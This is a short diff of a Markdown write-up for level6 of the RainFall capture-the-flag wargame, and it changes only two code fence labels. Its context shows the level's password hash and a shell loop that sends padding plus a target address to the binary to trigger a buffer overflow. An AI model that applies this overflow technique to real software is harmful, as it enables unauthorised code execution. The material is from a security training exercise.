@@ -4,7 +4,7 @@ pass : `d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`
 
 ## Sources :
 
-```c=
+```c
 #include <stdlib.h>
 
 void	n() {
@@ -61,7 +61,7 @@ for((i=64; i<80; i++)); do echo "index $i"; ./level6 `(perl -e 'print "A"x('$i')
 
 ## Exploit :
 
-```shell=
+```shell
 level6@RainFall:~$ for((i=64; i<80; i++)); do echo "index $i"; ./level6 `(perl -e 'print "A"x('$i')."\x54\x84\x04\x08"')` ;done
 index 64
 Nope
